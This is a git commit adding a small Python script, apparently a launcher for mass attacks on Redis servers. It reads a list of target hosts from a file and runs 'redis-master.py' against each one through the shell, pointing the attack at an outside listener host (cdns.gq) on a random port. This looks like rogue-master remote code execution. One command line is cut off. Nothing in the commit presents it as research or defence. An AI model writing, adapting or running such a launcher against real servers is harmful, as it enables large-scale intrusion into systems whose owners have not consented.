6201e71fb58812b2cb62a022b95a7c5db23f0586
bambeero1 <47931114+bambeero1@users.noreply.github.com>
2019-09-10 16:21:29 +0300

    Add files via upload

---
+++ exec.py
@@ -0,0 +1,23 @@
+import random
+import subprocess
+
+def main():
+
+        print("****Read all lines in file using readlines() *****")
+        fileHandler = open ("redis", "r")
+        listOfLines = fileHandler.readlines()
+        fileHandler.close()
+        for line in listOfLines:
+                host= line.strip()
+                r = random.randint(40000,50000)
+                cmd = 'python3 redis-master.py -r ' + host + ' -L cdns.gq -P ' + str(r) + ' $
+                print('========> running against host: ' + host)
+                print('========> running against port: ' + str(r))
+                print('========> command : ' + cmd)
+                try:
+                        subprocess.run(cmd, timeout=5, shell=True)
+                except subprocess.TimeoutExpired:
+                        print('process ran too long')
+
+if __name__ == '__main__':
+        main()
